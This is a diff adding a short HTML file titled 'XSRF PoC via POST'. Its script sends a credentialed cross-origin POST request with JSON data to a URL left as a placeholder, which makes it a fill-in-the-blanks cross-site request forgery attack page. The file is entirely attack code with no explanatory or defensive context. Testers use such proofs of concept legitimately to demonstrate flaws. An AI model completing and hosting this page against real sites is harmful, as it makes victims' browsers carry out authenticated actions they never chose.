@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <h1>XSRF PoC via POST</h1>
+    <script>
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', 'ADD_URL_HERE',true);
+      xhr.withCredentials = true;
+      var json = JSON.stringify(ADD_JSON_DATA_HERE);
+      xhr.onreadystatechange = function() {
+      if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+        console.log(xhr.responseText);
+        }       
+      }
+      xhr.send(json);
+    </script>
+  </body>
+</html>
